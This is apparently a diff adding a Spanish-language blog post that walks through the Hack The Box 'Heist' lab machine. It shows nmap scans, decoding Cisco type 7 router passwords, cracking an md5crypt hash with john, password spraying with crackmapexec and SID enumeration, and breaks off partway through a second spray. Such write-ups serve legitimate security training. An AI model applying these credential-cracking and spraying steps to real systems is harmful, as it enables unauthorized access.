@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Heist (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Heist (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-13T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Heist (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-13T00:00:00-06:00","datePublished":"2024-04-13T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Heist (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Heist (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-13T00:00:00-06:00" itemprop="datePublished">
+        Apr 13, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="https://labs.hackthebox.com/storage/avatars/131dbaba68b169bd5ff59ac09420b09f.png" alt="busqueda-avatar" /></p>
+
+<p>En este post vamos a estar haciendo la maquina Heist de la plataforma de Hack The Box donde mediante hashes de Cisco Password 7 que crackeamos vamos a hacer un password spray para ver a que usuario pertenece vamos a estar usando impacket-lookupsid para descubrir nuevos usuarios y conectarnos con evil-wirnm ya que el usuario forma parte del grupo Remote Management Users y para la escalada de privilegios mediante strings vamos a analizar un volcado de un PID que esta corriendo Firefox donde las credenciales serán las del usuario Administrador.</p>
+
+<h3 id="portscan"><strong>PortScan</strong></h3>
+
+<ul>
+  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th>Uso</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td>Solo queremos ver puertos abiertos.</td>
+    </tr>
+    <tr>
+      <td>-sS</td>
+      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
+    </tr>
+    <tr>
+      <td>–min-rate 5000</td>
+      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
+    </tr>
+    <tr>
+      <td>-vvv</td>
+      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
+    </tr>
+    <tr>
+      <td>-n</td>
+      <td>Para que no aplique resolución DNS.</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td>Para exportar la salida en formato Greppable.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.116.26 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:27 CST
+Initiating SYN Stealth Scan at 14:27
+Scanning 10.129.116.26 <span class="o">[</span>65535 ports]
+Discovered open port 49669/tcp on 10.129.116.26
+Discovered open port 5985/tcp on 10.129.116.26
+Discovered open port 80/tcp on 10.129.116.26
+Discovered open port 135/tcp on 10.129.116.26
+Discovered open port 445/tcp on 10.129.116.26
+Increasing send delay <span class="k">for </span>10.129.116.26 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
+Completed SYN Stealth Scan at 14:27, 52.89s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.129.116.26
+Host is up, received user-set <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2024-04-13 14:27:02 CST <span class="k">for </span>53s
+Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
+extractPorts <span class="o">()</span> <span class="o">{</span>
+	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
+	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">cat </span>extractPorts.tmp
+	<span class="nb">rm </span>extractPorts.tmp
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>La ejecutamos y nos copea los puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.116.26
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,135,445,5985,49669
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Uso</th>
+      <th>Párametro</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
+      <td>-sCV</td>
+    </tr>
+    <tr>
+      <td>Que no lo exporte a un archivo normal.</td>
+      <td>-oN</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,5985,49669 10.129.116.26 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:31 CST
+Nmap scan report <span class="k">for </span>10.129.116.26
+Host is up <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not <span class="nb">set</span>
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: <span class="nt">-4s</span>
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-04-13T20:32:40
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> vemos las tecnologías que esta usando en el puerto 80.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">7</span><span class="p">],</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">login_password</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Support</span> <span class="no">Login</span> <span class="no">Page</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que nos redirige a un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/1.png" />
+</p>
+
+<ul>
+  <li>Si observamos en la parte de abajo nos dice <code class="language-plaintext highlighter-rouge">Login as guest</code> si damos <code class="language-plaintext highlighter-rouge">click</code> vemos que funciona correctamente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/2.png" />
+</p>
+
+<ul>
+  <li>El usuario Hazard nos habla de que ah estado experimentando problemas con su <code class="language-plaintext highlighter-rouge">router cisco</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/3.png" />
+</p>
+
+<ul>
+  <li>Si vemos el <strong>Attachment</strong> nos muestra el archivo de configuración que nos dice que el usuario <strong>admin</strong> estaba usando.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/4.png" />
+</p>
+
+<ul>
+  <li>Vemos que mencionan mucho el <code class="language-plaintext highlighter-rouge">password</code> 7.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</a> podemos apoyarnos de ese recurso para poder ver las contraseñas en texto plano simplemente pasándole el hash <code class="language-plaintext highlighter-rouge">0242114B0E143F015F5D1E161713</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/5.png" />
+</p>
+
+<ul>
+  <li>Esta es del otro hash.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/6.png" />
+</p>
+
+<ul>
+  <li>Podemos aplicar un <code class="language-plaintext highlighter-rouge">PasswordSpray</code> para probar las credenciales que tenemos y el usuario Hazard.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
+admin
+rout3r
+hazard
+</code></pre></div></div>
+
+<ul>
+  <li>Si recordamos también nos dan un hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat hash</span>
+<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar <code class="language-plaintext highlighter-rouge">john</code> para crackearlo y añadirlo a nuestra lista para poder aplicar el <code class="language-plaintext highlighter-rouge">password spray</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
+Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+stealth1agent    <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:32 DONE <span class="o">(</span>2024-04-13 15:00<span class="o">)</span> 0.03101g/s 108732p/s 108732c/s 108732C/s stealthy001..ste88dup
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Estas son las contraseñas que tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>creds.txt
+Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
+<span class="nv">$uperP</span>@ssword
+stealth1agent
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que tenemos credenciales validas para el usuario hazard.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 -u users.txt -p creds.txt --continue-on-success
+SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos estos recursos compartidos a nivel de red pero no son interesantes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> hazard <span class="nt">-p</span> stealth1agent <span class="nt">--shares</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Enumerated shares
+SMB         10.129.116.26   445    SUPPORTDESK      Share           Permissions     Remark
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.116.26   445    SUPPORTDESK      ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.116.26   445    SUPPORTDESK      C<span class="nv">$ </span>                             Default share
+SMB         10.129.116.26   445    SUPPORTDESK      IPC<span class="nv">$ </span>           READ            Remote IPC
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a enumerar por <code class="language-plaintext highlighter-rouge">RPC</code> ya que el puerto esta abierto.</p>
+  </li>
+  <li>
+    <p>Pero no podemos.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hazard%stealth1agent"</span> 10.129.116.26
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_CONNECTION_DISCONNECTED
+</code></pre></div></div>
+
+<ul>
+  <li>Algo que podemos hacer es conectarnos al panel de <code class="language-plaintext highlighter-rouge">login</code> ya que tenemos credenciales validas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/7.png" />
+</p>
+
+<ul>
+  <li>Nos piden un email pero a saber cual si probamos con el de la maquina no nos deja.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/8.png" />
+</p>
+
+<h2 id="shell-as-chase">Shell as Chase</h2>
+
+<ul>
+  <li>Bueno algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">lookupsid.py</code> con esto podemos enumerar mas usuarios validos a nivel de sistema a partir de sus SID correspondientes pero necesitamos el dominio de la maquina a si que vamos a ver cual es con la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y encontramos nuevos usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-lookupsid SUPPORTDESK/hazard:stealth1agent@10.129.116.26
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.129.116.26
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.129.116.26[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+501: SUPPORTDESK<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+503: SUPPORTDESK<span class="se">\D</span>efaultAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
+504: SUPPORTDESK<span class="se">\W</span>DAGUtilityAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
+513: SUPPORTDESK<span class="se">\N</span>one <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+1008: SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1009: SUPPORTDESK<span class="se">\s</span>upport <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1012: SUPPORTDESK<span class="se">\C</span>hase <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1013: SUPPORTDESK<span class="se">\J</span>ason <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver si uno de los usuarios que tenemos reutiliza alguna contraseña de las que tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--continue-on-success</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\a</span>dmin:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
